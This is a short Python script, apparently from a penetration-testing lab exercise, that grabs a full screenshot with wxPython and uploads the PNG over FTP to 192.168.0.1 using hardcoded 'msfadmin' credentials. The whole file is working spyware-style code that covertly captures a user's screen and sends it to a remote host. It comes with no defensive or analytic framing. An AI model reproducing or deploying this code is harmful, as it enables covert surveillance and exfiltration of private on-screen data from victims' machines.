#Screenshot Grabber
#cmd: pip3 install wxpython (PY GUI toolkit)
import wx
import os
import ftplib

#initialize the wx toolkit
w = wx.App()
#create wrapper to capture the screen
screen = wx.ScreenDC()
#size of the screenshot
size = screen.GetSize()
#create bitmap with size of screenshot
bmap = wx.Bitmap(size[0], size[1])
#write screenshot to bitmap
memo = wx.MemoryDC(bmap)
memo.Blit(0, 0, size[0], size[1], screen, 0, 0)

del memo
#save screenshot to .png file
bmap.SaveFile("screenshotgrabbed.png", wx.BITMAP_TYPE_PNG)

#create session and credentials for login
sess_ = ftplib.FTP("192.168.0.1", "msfadmin", "msfadmin")

#creates the file for saving
file_ = open("screenshotgrabbed.png", "rb")

#store screen grab into file location
sess_.storbinary("STOR /tmp/screenshotgrabbed.png", file_)

file_.close()
sess_.quit()